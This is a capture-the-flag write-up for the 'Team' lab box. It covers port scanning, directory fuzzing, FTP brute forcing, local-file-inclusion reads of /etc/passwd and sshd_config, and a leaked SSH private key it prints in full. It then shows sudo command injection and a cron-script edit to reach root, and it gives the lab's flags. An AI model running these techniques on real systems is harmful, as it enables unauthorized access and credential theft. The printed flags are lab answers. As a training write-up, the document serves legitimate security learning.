# Team

Laurent Chauvin | April 15, 2024

## Resources

[1] https://github.com/danielmiessler/SecLists

## Progress

```
export IP=10.10.241.122
```

#### Task 1 : Deploy the box

Nothing to do

#### Task 2 : Flags

Nmap scan:

```bash
nmap -sC -sV -oN nmap/initial 10.10.241.122

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 20:27 EDT
Nmap scan report for 10.10.241.122
Host is up (0.10s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds
```

Web server, let's check this out. Default Apache webpage. Let's run `gobuster`:

```bash

```

While `gobuster` is running, let's check the ftp. Let's search for an exploit quickly:

```bash
searchsploit vsftpd 3.0.3

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
vsftpd 3.0.3 - Remote Denial of Service                                                                                                                                                                   | multiple/remote/49719.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results

```

Not sure what to do with a denial of service.
We could try to bruteforce it if we had a username.

When inspecting the webpage, I found:

```
Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!
```

Let's try to add this hosts:

```bash
sudo emacs /etc/hosts

127.0.0.1	localhost
10.10.241.122   team.thm
```

Now, when going to http://team.thm we're getting another webpage. This page is a template from TEMPLATED.

Let's run `gobuster` on this website:

```bash
gobuster dir -u team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/server-status        (Status: 403) [Size: 273]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Nothings significant in `/images`.

The hint says `As the "dev" site is under contruction maybe it has some flaws? "url?=" + "This rooms picture"`.

I tried to fuzz this parameter but nothing:

```bash
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt http://team.thm/url?=FUZZ

...
000000921:   404        9 L      31 W       270 Ch      "welcome"
000000920:   404        9 L      31 W       270 Ch      "webvpn"
000000919:   404        9 L      31 W       270 Ch      "webstats"
000000916:   404        9 L      31 W       270 Ch      "webservices"
000000913:   404        9 L      31 W       270 Ch      "webmaster"
000000918:   404        9 L      31 W       270 Ch      "webstat"      
000000917:   404        9 L      31 W       270 Ch      "website"
000000914:   404        9 L      31 W       270 Ch      "websearch"
000000912:   404        9 L      31 W       270 Ch      "webmail"
000000911:   404        9 L      31 W       270 Ch      "weblogs"
000000910:   404        9 L      31 W       270 Ch      "weblogic"
000000909:   404        9 L      31 W       270 Ch      "weblog"
000000906:   404        9 L      31 W       270 Ch      "webdist"
000000908:   404        9 L      31 W       270 Ch      "WEB-INF"
000000904:   404        9 L      31 W       270 Ch      "webdata"
000000951:   404        9 L      31 W       270 Ch      "zips"
000000902:   404        9 L      31 W       270 Ch      "webboard"
000000905:   404        9 L      31 W       270 Ch      "webdav"

Total time: 9.285423
Processed Requests: 951
Filtered Requests: 0
Requests/sec.: 102.4185
```

Let's try to `gobuster` some files"

```bash
gobuster dir -u team.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,sql,bak,tar,tar.gz,db,zip,sqlite | tee gobuster_files.log
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,db,sqlite,bak,tar,tar.gz,zip,php,txt,sql
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 273]
/.php                 (Status: 403) [Size: 273]
/index.html           (Status: 200) [Size: 2966]
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/robots.txt           (Status: 200) [Size: 5]
```

Nothing much. Let's check `robots.txt`. That's interesting, we find `dale` in it. Probably a directory, but also a username.

Let's try to use it to bruteforce the ftp:

```bash
hydra -l dale -P /opt/rockyou.txt ftp://10.10.241.122

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-15 21:43:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.241.122:21/
[STATUS] 288.00 tries/min, 288 tries in 00:01h, 14344110 to do in 830:06h, 16 active
[STATUS] 266.33 tries/min, 799 tries in 00:03h, 14343599 to do in 897:36h, 16 active
[STATUS] 266.43 tries/min, 1865 tries in 00:07h, 14342533 to do in 897:13h, 16 active
```

Nevermind, too long.

Let's search for files in `dale` (would it work if the `robots.txt` prevents it?):

```bash

```

Let's check the `scripts` directory:

```bash
gobuster dir -u team.thm/scripts -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,sql,bak,tar,tar.gz,db,zip,sqlite     

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/scripts
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,sql,bak,zip,php,tar,tar.gz,db,sqlite
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 273]
/.html                (Status: 403) [Size: 273]
/script.txt           (Status: 200) [Size: 597]
```

What is `script.txt`? Let's check this out:

```bash
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

Hum, very interesting. It seems that the same script with another extension has the credentials. Let's try some:

```
scripts.old
```

Sweet !! First try !!

```bash
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

Let's connect to ftp now:

```bash
ftp ftpuser@10.10.241.122 

Connected to 10.10.241.122.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Let's list files (we need to turn off passive mode):

```bash
ftp> ls
229 Entering Extended Passive Mode (|||48583|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||48788|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxrwxr-x    2 65534    65534        4096 Jan 15  2021 workshare
226 Directory send OK.
```

Let's investigate:

```bash
ftp> cd workshare
250 Directory successfully changed.
ftp> get New_site.txt
local: New_site.txt remote: New_site.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
100% |***********************************************************************************************************************************************************************************************|   269      132.94 KiB/s    00:00 ETA
226 Transfer complete.
269 bytes received in 00:00 (2.88 KiB/s)
ftp> 
```

Let's check `New_site.txt`:

```
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 
```

Trying `http://dev.team.thm` didn't work. I tried many things, but I had to go look a write-up.

In the end, you also need to add this to the hosts file:

```
127.0.0.1	localhost
10.10.42.0   team.thm dev.team.thm
```

When clicking on the link, we have this url `http://dev.team.thm/script.php?page=teamshare.php`.

File inclusion ?

Indeed !! Going there http://dev.team.thm/script.php?page=../../../../../../etc/passwd reveal the file:

```bash
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin 
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
lxd:x:105:65534::/var/lib/lxd/:/bin/false 
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
pollinate:x:109:1::/var/cache/pollinate:/bin/false 
dale:x:1000:1000:anon,,,:/home/dale:/bin/bash 
gyles:x:1001:1001::/home/gyles:/bin/bash 
ftpuser:x:1002:1002::/home/ftpuser:/bin/sh 
ftp:x:110:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin sshd:x:111:65534::/run/sshd:/usr/sbin/nologin 
```

We can see `dale` and `gyles`. Let's try their home directories.

Dale first: http://dev.team.thm/script.php?page=../../../../../../home/dale/user.txt

```
THM{6Y0TXHz7c2d} 
```

Sweet !!

How to get root now?

Maybe we could upload a backdoor to the ftp to get a reverse shell, and include it with the LFI to execute it. But can the website access the ftp?

We can see the home of `ftpuser`, so let's try to include the `New_site.txt` file: http://dev.team.thm/script.php?page=../../../../../../home/ftpuser/workshare/New_site.txt

It works !!!

Let's try to upload a reverse shell:

```bash
ftp -n <<EOF

open 10.10.42.0
heredoc> open 10.10.42.0   
heredoc> user ftpuser  
heredoc> passive off             
heredoc> cd workshare                                                        
heredoc> put reverse_shell.php   
heredoc> EOF
Connected to 10.10.42.0.
220 (vsFTPd 3.0.3)
Already connected to 10.10.42.0, use close first.
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
Passive mode: off; fallback to active mode: off.
250 Directory successfully changed.
local: reverse_shell.php remote: reverse_shell.php
200 EPRT command successful. Consider using EPSV.
550 Permission denied.
221 Goodbye.
```

We don't seem to have the permissions.

I just remembered they said to put their `id_rsa` in some config files. Let's try to fuzz that. I used a filelist in [1].

```bash
wfuzz -c -z file,/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hc 404,400 http://dev.team.thm/script.php?page=../../../../../../../../../../../FUZZ
```

This command returned too many results. Let's filter for ssh first:

```bash
wfuzz -c -z file,/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --hc 404,400 --ss ssh http://dev.team.thm/script.php?page=../../../../../../../../../../../FUZZ

/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.team.thm/script.php?page=../../../../../../../../../../../FUZZ
Total requests: 880

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000001:   200        34 L     42 W       1698 Ch     "/etc/passwd"                                                                                                                                                              
000000081:   200        169 L    447 W      5990 Ch     "/etc/ssh/sshd_config"                                                                                                                                                     
000000080:   200        52 L     218 W      1581 Ch     "/etc/ssh/ssh_config"                                                                                                                                                      
000000342:   200        61 L     60 W       829 Ch      "/etc/group-"                                                                                                                                                              
000000178:   200        5332 L   31922 W    364050 Ch   "/var/log/dpkg.log"                                                                                                                                                        
000000341:   200        61 L     60 W       835 Ch      "/etc/group"                                                                                                                                                               
000000401:   200        34 L     42 W       1696 Ch     "/etc/passwd-"                                                                                                                                                             
000000471:   200        5 L      45 W       404 Ch      "/etc/updatedb.conf"                                                                                                                                                       

Total time: 9.213760
Processed Requests: 880
Filtered Requests: 872
Requests/sec.: 95.50932
```

Let's try `/etc/ssh/ssh_config` first:

```
# This is the ssh client system-wide configuration file. See # ssh_config(5) for more information. This file provides defaults for # users, and the values can be changed in per-user configuration files # or on the command line. # Configuration data is parsed as follows: # 1. command line options # 2. user-specific file # 3. system-wide file # Any configuration value is only changed the first time it is set. # Thus, host-specific definitions should be at the beginning of the # configuration file, and defaults at the end. # Site-wide defaults for some commonly used options. For a comprehensive # list of available options, their meanings and defaults, please see the # ssh_config(5) man page. Host * # ForwardAgent no # ForwardX11 no # ForwardX11Trusted yes # PasswordAuthentication yes # HostbasedAuthentication no # GSSAPIAuthentication no # GSSAPIDelegateCredentials no # GSSAPIKeyExchange no # GSSAPITrustDNS no # BatchMode no # CheckHostIP yes # AddressFamily any # ConnectTimeout 0 # StrictHostKeyChecking ask # IdentityFile ~/.ssh/id_rsa # IdentityFile ~/.ssh/id_dsa # IdentityFile ~/.ssh/id_ecdsa # IdentityFile ~/.ssh/id_ed25519 # Port 22 # Protocol 2 # Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc # MACs hmac-md5,hmac-sha1,umac-64@openssh.com # EscapeChar ~ # Tunnel no # TunnelDevice any:any # PermitLocalCommand no # VisualHostKey no # ProxyCommand ssh -q -W %h:%p gateway.example.com # RekeyLimit 1G 1h SendEnv LANG LC_* HashKnownHosts yes GSSAPIAuthentication yes 
```

Not much. Let's try `/etc/ssh/sshd_config`:

```
# $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #RSAAuthentication yes #LoginGraceTime 2m PermitRootLogin without-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 PubkeyAuthentication yes PubkeyAcceptedKeyTypes=+ssh-dss # Expect .ssh/authorized_keys2 to be disregarded by default in future. #AuthorizedKeysFile /home/%u/.ssh/authorized_keys #AuthorizedPrincipalsFile none #AuthorizedKeysCommand none #AuthorizedKeysCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don't trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don't read the user's ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! #PasswordAuthentication yes #PermitEmptyPasswords no # Change to yes to enable challenge-response passwords (beware issues with # some PAM modules and threads) ChallengeResponseAuthentication no # Kerberos options #KerberosAuthentication no #KerberosOrLocalPasswd yes #KerberosTicketCleanup yes #KerberosGetAFSToken no # GSSAPI options #GSSAPIAuthentication no #GSSAPICleanupCredentials yes #GSSAPIStrictAcceptorCheck yes #GSSAPIKeyExchange no # Set this to 'yes' to enable PAM authentication, account processing, # and session processing. If this is enabled, PAM authentication will # be allowed through the ChallengeResponseAuthentication and # PasswordAuthentication. Depending on your PAM configuration, # PAM authentication via ChallengeResponseAuthentication may bypass # the setting of "PermitRootLogin without-password". # If you just want the PAM account and session checks to run without # PAM authentication, then enable this but set PasswordAuthentication # and ChallengeResponseAuthentication to 'no'. UsePAM no #AllowAgentForwarding yes #AllowTcpForwarding yes #GatewayPorts no X11Forwarding yes #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes PrintMotd no #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # Allow client to pass locale environment variables AcceptEnv LANG LC_* # override default of no subsystems Subsystem sftp /usr/lib/openssh/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server AllowUsers dale gyles #Dale id_rsa #-----BEGIN OPENSSH PRIVATE KEY----- #b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn #NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE #NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W #oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK #o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP #zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu #k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS #xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S #0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2 #EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU #eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v #7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v #JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/ #FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l #gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4 #xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH #ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb #esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO #eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R #N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg #Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi #U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW #/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz #82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA #wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q #z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6 #RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7 #/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx #sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb #mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur #4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg #e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S #2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH #8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX #b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7 #CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH #-----END OPENSSH PRIVATE KEY----- 
```

Nice, we got some private key.

Let's use it then.

This part took more time that I wished. First I formatted the key to remove the comments (don't forget to add an empty line at the end, or it won't work. Took me a while to figure this out !!). Then `chmod 600 dale_id_rsa`.

Finally:

```bash
ssh -i dale_id_rsa dale@10.10.42.0     

Last login: Tue Apr 16 04:34:31 2024 from 10.6.31.49
dale@TEAM:~$ 
```

Let's check `sudo`:

```bash
dale@TEAM:~$ sudo -l

Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

By looking at the bash history we can see:

```bash
sudo -u gyles /home/gyles/admin_checks
```

Let's try:

```bash
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks

Reading stats.
Reading stats..
Enter name of person backing up the data: me
Enter 'date' to timestamp the file: 
The Date is Stats have been backed up
```

What is this script doing?

```bash
dale@TEAM:~$ cat /home/gyles/admin_checks

#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```

We can read `/var/stats/stats.txt`, so if we could poison `echo`, then we could pass any file we want as `name`, and it would dump it into `/var/stats/stats.txt`.

By looking at the `PATH`:

```bash
dale@TEAM:~/.local$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
```

and into the first folder, I found this:

```bash
dale@TEAM:~/.local$ ll /usr/local/sbin/

total 12
drwxr-xr-x  2 root root 4096 Jan 17  2021 ./
drwxr-xr-x 10 root root 4096 Jan 15  2021 ../
-rwxr-xr-x  1 root root   64 Jan 17  2021 dev_backup.sh*
```

```bash
dale@TEAM:~/.local$ cat /usr/local/sbin/dev_backup.sh 

#!/bin/bash
cp -r /var/www/dev.team.thm/* /var/backups/www/dev/
```

Interesting, this is probably run on a cronjob, with root privileges. I think those 2 routes would work.

Let's also check for SUID files, just in case:

```bash
dale@TEAM:~/.local$ find / -perm -u=s 2>/dev/null

/bin/mount
/bin/umount
/bin/fusermount
/bin/ntfs-3g
/bin/ping
/bin/su
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

Nothing seems really exploitable.

After turning for a while, I didn't manage to elevate privileges. So I looked at a write-up, and as `admin_checks` is using `read`, we could pass a binary and it would execute it (I wasn't aware of that. Nice lesson !!).

So, let's try again:

```bash
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: 
Enter 'date' to timestamp the file: /bin/bash
The Date is 

whoami
gyles
```

Nice. Let's stabilize:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

gyles@TEAM:~$ 
```

Nice. By looking at it's bash history we can see `nano /usr/local/bin/main_backup.sh`. 

So it seems gyles is able to modify this scripts.

Let's add some code in it to bring us the flag:

```bash
nano /usr/local/bin/main_backup.sh 

#!/bin/bash
cp -r /var/www/team.thm/* /var/backups/www/team.thm/

cp /root/root.txt /home/gyles/root.txt
chmod 777 /home/gyles/root.txt
```

Let's save, and wait.

Then:

```bash
gyles@TEAM:/home/gyles$ ls -al

total 52
drwxr-xr-x 6 gyles gyles   4096 Apr 16 05:13 .
drwxr-xr-x 5 root  root    4096 Jan 15  2021 ..
-rwxr--r-- 1 gyles editors  399 Jan 15  2021 admin_checks
-rw------- 1 gyles gyles   5639 Jan 17  2021 .bash_history
-rw-r--r-- 1 gyles gyles    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 gyles gyles   3771 Apr  4  2018 .bashrc
drwx------ 2 gyles gyles   4096 Jan 15  2021 .cache
drwx------ 3 gyles gyles   4096 Jan 15  2021 .gnupg
drwxrwxr-x 3 gyles gyles   4096 Jan 15  2021 .local
-rw-r--r-- 1 gyles gyles    807 Apr  4  2018 .profile
-rwxrwxrwx 1 root  root      18 Apr 16 05:14 root.txt
drwx------ 2 gyles gyles   4096 Jan 15  2021 .ssh
-rw-r--r-- 1 gyles gyles      0 Jan 17  2021 .sudo_as_admin_successful
```

Our flag:

```
gyles@TEAM:/home/gyles$ cat root.txt 

THM{fhqbznavfonq}
```

## Flag

1. `THM{6Y0TXHz7c2d} `

2. `THM{fhqbznavfonq}`
